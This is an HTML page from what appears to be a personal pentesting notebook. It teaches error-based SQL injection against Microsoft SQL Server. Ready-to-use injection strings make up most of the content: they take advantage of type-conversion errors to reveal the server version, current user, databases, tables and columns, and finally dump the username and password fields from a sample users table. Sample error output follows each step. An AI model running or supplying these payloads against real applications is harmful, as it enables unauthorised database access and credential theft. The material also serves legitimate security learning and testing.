
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <meta charset="UTF-8">
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <title>MSSQL Server Â· GitBook</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="GitBook 3.2.3">
        
        
        
    
    <link rel="stylesheet" href="../../../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-search/search.css">
                
            
                
                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
        

    

    
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../../../gitbook/images/favicon.ico" type="image/x-icon">

    
    <link rel="next" href="mysql-server.html" />
    
    
    <link rel="prev" href="./" />
    

    </head>
    <body>
        
<div class="book">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    

    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../../../">
            
                <a href="../../../">
            
                    
                    Yo
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">Web Stuff</li>
        
        
    
        <li class="chapter " data-level="2.1" data-path="../../http-basics.md">
            
                <span>
            
                    
                    HTTP Basics
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.2" data-path="../">
            
                <a href="../">
            
                    
                    SQLi
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.2.1" data-path="../sqli-basics.html">
            
                <a href="../sqli-basics.html">
            
                    
                    SQLi Basics
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.2.2" data-path="../in-band-sqli.html">
            
                <a href="../in-band-sqli.html">
            
                    
                    In-band SQLi
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.2.3" data-path="./">
            
                <a href="./">
            
                    
                    Error-based SQLi
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter active" data-level="2.2.3.1" data-path="mssql-server.html">
            
                <a href="mssql-server.html">
            
                    
                    MSSQL Server
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.2.3.2" data-path="mysql-server.html">
            
                <a href="mysql-server.html">
            
                    
                    MySQL Server
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.2.3.3" data-path="postgresql-server.html">
            
                <a href="postgresql-server.html">
            
                    
                    postgreSQL Server
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.2.4" data-path="../blind-sqli/">
            
                <a href="../blind-sqli/">
            
                    
                    Blind SQLi
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.2.4.1" data-path="../blind-sqli/bisection-technique.html">
            
                <a href="../blind-sqli/bisection-technique.html">
            
                    
                    Bisection Technique
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.2.4.2" data-path="../blind-sqli/time-based-blind-sqli.html">
            
                <a href="../blind-sqli/time-based-blind-sqli.html">
            
                    
                    Time-Based Blind SQLi
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.2.5" data-path="../sqlmap.html">
            
                <a href="../sqlmap.html">
            
                    
                    SQLmap
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.3" data-path="../../lfi.md">
            
                <span>
            
                    
                    LFI
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">Windows stuff</li>
        
        
    
        <li class="chapter " data-level="3.1" data-path="../../../windows-stuff/basic-windows-enumeration.html">
            
                <a href="../../../windows-stuff/basic-windows-enumeration.html">
            
                    
                    Basic Windows Enumeration
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.2" data-path="../../../windows-stuff/samba.html">
            
                <a href="../../../windows-stuff/samba.html">
            
                    
                    SAMBA
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.3" data-path="../../../windows-stuff/ldap-ad.html">
            
                <a href="../../../windows-stuff/ldap-ad.html">
            
                    
                    LDAP / AD
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.4" data-path="../../../windows-stuff/empire-rip.html">
            
                <a href="../../../windows-stuff/empire-rip.html">
            
                    
                    Empire (RIP)
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">LINUX STUFF</li>
        
        
    
        <li class="chapter " data-level="4.1" data-path="../../../linux-stuff/exploitation.html">
            
                <a href="../../../linux-stuff/exploitation.html">
            
                    
                    Exploitation
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2" data-path="../../../linux-stuff/priviledge-escalation/">
            
                <a href="../../../linux-stuff/priviledge-escalation/">
            
                    
                    Priviledge Escalation
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="4.2.1" data-path="../../../linux-stuff/priviledge-escalation/getting-a-proper-shell.html">
            
                <a href="../../../linux-stuff/priviledge-escalation/getting-a-proper-shell.html">
            
                    
                    Getting a proper shell!
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.2" data-path="../../../linux-stuff/priviledge-escalation/enum-inside-linux.html">
            
                <a href="../../../linux-stuff/priviledge-escalation/enum-inside-linux.html">
            
                    
                    Enum inside linux
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.3" data-path="../../../linux-stuff/priviledge-escalation/suid-and-guid.html">
            
                <a href="../../../linux-stuff/priviledge-escalation/suid-and-guid.html">
            
                    
                    SUID and GUID
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.4" data-path="../../../linux-stuff/priviledge-escalation/crontab.html">
            
                <a href="../../../linux-stuff/priviledge-escalation/crontab.html">
            
                    
                    Crontab
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.5" data-path="../../../linux-stuff/priviledge-escalation/sudo.html">
            
                <a href="../../../linux-stuff/priviledge-escalation/sudo.html">
            
                    
                    Sudo
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    
        
        <li class="header">ENUMERATION</li>
        
        
    
        <li class="chapter " data-level="5.1" data-path="../../../enumeration/enumeration.html">
            
                <a href="../../../enumeration/enumeration.html">
            
                    
                    Enumeration
            
                </a>
            

            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
            Published with GitBook
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href="../../.." >MSSQL Server</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <h1 id="mssql-server">MSSQL Server</h1>
<p>In MSSQL, the name of the database objects are revealed within errors. the user sa is the super admin and has access to the master database. The master database contains schemas of user-defined dbs.</p>
<p>First thing we can do to start exploting it is to discover the database version, we can trigger a type conversion error for that.</p>
<pre><code class="lang-text">99999 or 1 in (SELECT TOP 1 CAST(&lt;FIELDNAME&gt; as varchar(4096)) from &lt;TABLENAME&gt; WHERE &lt;FIELDNAME&gt; NOT IN (&lt;LIST&gt;)); --
</code></pre>
<ul>
<li><code>99999</code> is a bogus value.</li>
<li><code>or 1 in</code> is the part of the query that will trigger the error, we are trying to find 1, an integer, within a varchar column.</li>
<li><code>CAST(&lt;FIELDNAME&gt; as varchar(4096))</code> is where we insert the column that we want to dump (either user-based or special database column). </li>
<li><code>&lt;FIELDNAME&gt;</code> can also be a SQL function like <code>user_name()</code> or a variable like <code>@@version</code></li>
<li><code>WHERE &lt;FIELDNAME&gt; NOT IN (&lt;LIST&gt;)</code> this part is used to dump the database and can be ommited or ajusted.</li>
</ul>
<p>To retrieve the SQL version:</p>
<pre><code class="lang-text">99999 or 1 in (SELECT TOP 1 CAST(@@version as varchar(4096))) --
</code></pre>
<pre><code class="lang-text">[Microsoft] [SQL Server Native Client 10.0] [SQL Server]Conversion failed when converting the varchar value &apos;Microsoft SQL Server 2008 R2 (SP2) - 10.50.4000.0 (X64) Jun 28 2012 08:36:30 Copyright (c) Microsoft Corporation Express Edition (64-bit) on Windows NT 6.1 (Build 7601: Service Pack 1) (Hypervisor) &apos; to data type int.
</code></pre>
<p>So, with all this information, how can I dump the entire database?</p>
<p>First of all, we need to discover some stuff:</p>
<ul>
<li>Current database username:</li>
</ul>
<pre><code class="lang-text">99999 or 1 in (SELECT TOP 1 CAST(user_name() as varchar(4096))) --
</code></pre>
<p>*user_name() is a MSSQL function which returns the current user.</p>
<ul>
<li>Current databases and all other databases the user can read</li>
</ul>
<pre><code class="lang-text">99999 or 1 in (SELECT TOP 1 CAST(db_name(0) as varchar(4096))) --
99999 or 1 in (SELECT TOP 1 CAST(db_name(1) as varchar(4096))) --
99999 or 1 in (SELECT TOP 1 CAST(db_name(2) as varchar(4096))) --
</code></pre>
<p>*db_name() functoin accesses the master..sysdatabases table, which stores all databases installed. We can only see dbs that the user has rights to.</p>
<ul>
<li>The tables into a given database</li>
</ul>
<p>To enumerate all tables in a database, we can use the following payload:</p>
<pre><code class="lang-text">9999 or 1 in (SELECT TOP 1 CAST(name as varchar (4096)) FROM &lt;database name&gt;..sysobjects WHERE xtype=&apos;U&apos; and name NOT IN (&lt;known table list&gt;)); --
</code></pre>
<ul>
<li><code>xtype means=&apos;U&apos;</code> means we only want user-defined tables</li>
<li><code>name NOT IN (&apos;&lt;know table list&gt;&apos;)</code> name is a column of the sysobjects table. Everytime we find a new table we will append it to the NOT IN list. This is needed because the error display only the first table name.</li>
<li>The columns of a given table</li>
</ul>
<p>After retrieving the tables, we can retrieve the columns using the following payload:</p>
<pre><code class="lang-text">9999 or 1 in (SELECT TOP 1 CAST (&lt;db name&gt;..syscolumns.name as varchar (4096)) FROM &lt;db name&gt;..syscolumns,&lt;db name&gt;..sysobjects WHERE &lt;db name&gt;..syscolumns.id=&lt;db name&gt;..sysobjects.id AND &lt;dbname&gt;. .sysobjects.name=&lt;table name&gt; AND &lt;db name&gt;..syscolumns.name NOT IN (&lt;known column list&gt;)); --
</code></pre>
<ul>
<li><code>&lt;db name&gt;</code> is the name of database we&apos;re working on</li>
<li><code>&lt;table name&gt;</code> is the table which we&apos;re trying to find the columns</li>
<li><code>&lt;known column list&gt;</code> list of columns we already discovered</li>
</ul>
<p>Finally, to dump the database, we can use the following query:</p>
<pre><code class="lang-text">9999 or 1 in (SELECT TOP 1 CAST (&lt;column name&gt; as varchar (4096) ) FROM &lt;db name&gt;..&lt;table name&gt; WHERE &lt;column name&gt; NOT IN (&lt;retrieved data list&gt;)); -- -
</code></pre>
<h2 id="example">Example</h2>
<p>Lets say we have an exploitable page.php?id=1 and identified the table users in the database cms</p>
<p>This table contains:</p>
<ul>
<li>id - integer</li>
<li>username - varchar</li>
<li>password - varchar</li>
</ul>
<p>To retrieve the ID values, we can use the following payload:</p>
<pre><code class="lang-text">9999 or 1 IN (SELECT TOP 1 CAST(id as varchar) %2bchar(64) FROM cms..users WHERE id NOT IN (&apos;&apos;)); -- -
</code></pre>
<p>We need to concatenate the id value with @ to make sure the selected value has the data type varchar, this makes the error possible:</p>
<pre><code class="lang-text">[Microsoft] [SQL Server Native Client 10.0] [SQL Server]Conversion failed when converting the varchar value &apos;1@&apos; to data type int.
</code></pre>
<p>Proceed to filter out <code>1</code> and query again:</p>
<pre><code class="lang-text">9999 OR 1 IN (SELECT TOP 1 CAST(id as varchar) %2bchar (64) FROM cms..users WHERE id NOT IN (&apos;1&apos;)); -- -
</code></pre>
<p>So, the resulting error is something like</p>
<pre><code class="lang-text">Microsoft] [SQL Server Native Client 10.0] [SQL Server]Conversion failed when converting the varchar value &apos;2@&apos; to data type int.
</code></pre>
<p>After enumerating the ID, basically request the username or/and password:</p>
<pre><code class="lang-text">9999 OR 1 IN (SELECT TOP 1 CAST(username as varchar) FROM cms..users WHERE id=1); -- -
9999 OR 1 IN (SELECT TOP 1 CAST(password as varchar) FROM cms..users WHERE id=1); -- -
9999 OR 1 IN (SELECT username%2bchar(64) %2bpassword FROM cms..users WHERE id=1); -- -
</code></pre>

                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="./" class="navigation navigation-prev " aria-label="Previous page: Error-based SQLi">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
                <a href="mysql-server.html" class="navigation navigation-next " aria-label="Next page: MySQL Server">
                    <i class="fa fa-angle-right"></i>
                </a>
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"MSSQL Server","level":"2.2.3.1","depth":3,"next":{"title":"MySQL Server","level":"2.2.3.2","depth":3,"path":"web-stuff/sqli/error-based-sqli/mysql-server.md","ref":"web-stuff/sqli/error-based-sqli/mysql-server.md","articles":[]},"previous":{"title":"Error-based SQLi","level":"2.2.3","depth":2,"path":"web-stuff/sqli/error-based-sqli/README.md","ref":"web-stuff/sqli/error-based-sqli/README.md","articles":[{"title":"MSSQL Server","level":"2.2.3.1","depth":3,"path":"web-stuff/sqli/error-based-sqli/mssql-server.md","ref":"web-stuff/sqli/error-based-sqli/mssql-server.md","articles":[]},{"title":"MySQL Server","level":"2.2.3.2","depth":3,"path":"web-stuff/sqli/error-based-sqli/mysql-server.md","ref":"web-stuff/sqli/error-based-sqli/mysql-server.md","articles":[]},{"title":"postgreSQL Server","level":"2.2.3.3","depth":3,"path":"web-stuff/sqli/error-based-sqli/postgresql-server.md","ref":"web-stuff/sqli/error-based-sqli/postgresql-server.md","articles":[]}]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"web-stuff/sqli/error-based-sqli/mssql-server.md","mtime":"2020-07-26T17:50:13.605Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2020-07-31T22:51:51.372Z"},"basePath":"../../..","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="../../../gitbook/gitbook.js"></script>
    <script src="../../../gitbook/theme.js"></script>
    
        
        <script src="../../../gitbook/gitbook-plugin-search/search-engine.js"></script>
        
    
        
        <script src="../../../gitbook/gitbook-plugin-search/search.js"></script>
        
    
        
        <script src="../../../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
        
    
        
        <script src="../../../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
        
    
        
        <script src="../../../gitbook/gitbook-plugin-sharing/buttons.js"></script>
        
    
        
        <script src="../../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    

    </body>
</html>

